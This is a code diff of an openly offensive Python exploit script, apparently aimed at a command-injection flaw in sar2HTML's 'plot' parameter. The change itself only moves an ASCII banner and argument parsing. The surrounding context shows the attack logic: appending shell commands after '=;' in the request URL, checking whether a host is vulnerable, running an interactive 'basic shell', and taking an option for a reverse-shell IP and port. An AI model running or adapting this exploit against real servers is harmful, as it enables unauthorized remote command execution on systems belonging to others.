@@ -19,17 +19,32 @@ import argparse
 import os
 import time
 
-parser = argparse.ArgumentParser(description='Parse')
-parser.add_argument('-ip','--ip',help='Ip address to connect to', required=True)
-parser.add_argument('-rip','--reverse-ip-port',help='Reverse ip and port in format IP:PORT')
-parser.add_argument('-pe','--path-extra',help='Any path between normal exploit. eg: /sar2HTML/index.php?plot=;')
-args = parser.parse_args()
 
 class col:
     RED = '\033[31m'
     CYAN = '\033[96m'
     GREEN = '\033[92m'
     RESET = '\033[0m'
+
+def banner():
+    ban = r"""                _____  _   _ ________  ___ _     
+               / __  \| | | |_   _|  \/  || |    
+ ___  __ _ _ __`' / /'| |_| | | | | .  . || |    
+/ __|/ _` | '__| / /  |  _  | | | | |\/| || |    
+\__ \ (_| | |  ./ /___| | | | | | | |  | || |____
+|___/\__,_|_|  \_____/\_| |_/ \_/ \_|  |_/\_____/
+                                                 
+                                                 """
+    print(col.GREEN + ban + col.RESET)
+
+banner()
+
+parser = argparse.ArgumentParser(description='Parse')
+parser.add_argument('-ip','--ip',help='Ip address to connect to', required=True)
+parser.add_argument('-rip','--reverse-ip-port',help='Reverse ip and port in format IP:PORT')
+parser.add_argument('-pe','--path-extra',help='Any path between normal exploit. eg: /sar2HTML/index.php?plot=;')
+args = parser.parse_args()
+
 
 #Check arguments
 if args.path_extra:
@@ -85,19 +100,6 @@ def runShell(url):
             url = url+"=;"+cmd
             r = s.get(url)
             printResults(r.text)
-
-def banner():
-    ban = r"""                _____  _   _ ________  ___ _     
-               / __  \| | | |_   _|  \/  || |    
- ___  __ _ _ __`' / /'| |_| | | | | .  . || |    
-/ __|/ _` | '__| / /  |  _  | | | | |\/| || |    
-\__ \ (_| | |  ./ /___| | | | | | | |  | || |____
-|___/\__,_|_|  \_____/\_| |_/ \_/ \_|  |_/\_____/
-                                                 
-                                                 """
-    print(col.GREEN + ban + col.RESET)
-
-banner()
 
 if checkHostIsVunerable(outURL):
     print("The Host Appears Vunerable, Running a basic shell ...")
